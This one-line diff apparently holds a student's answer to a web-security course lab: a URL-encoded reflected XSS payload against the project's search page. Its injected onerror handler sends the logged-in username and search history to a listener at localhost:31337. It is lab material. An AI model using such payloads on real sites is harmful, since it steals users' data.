@@ -1,0 +1,1 @@
+https://project2.ecen4133.org/search?q=%3Cimg+src%3D%22jh%22+onerror%3D%22%24.get%28%27http%3A%2F%2Flocalhost%3A31337%2F%27%2C%7Bstolen_user%3Adocument.getElementById%28%27logged-in-user%27%29.innerHTML%2Clast_search%3Adocument.getElementById%28%27history-list%27%29.getElementsByTagName%28%27a%27%29%5B1%5D.innerHTML%7D%29%22%3E&xssdefense=1
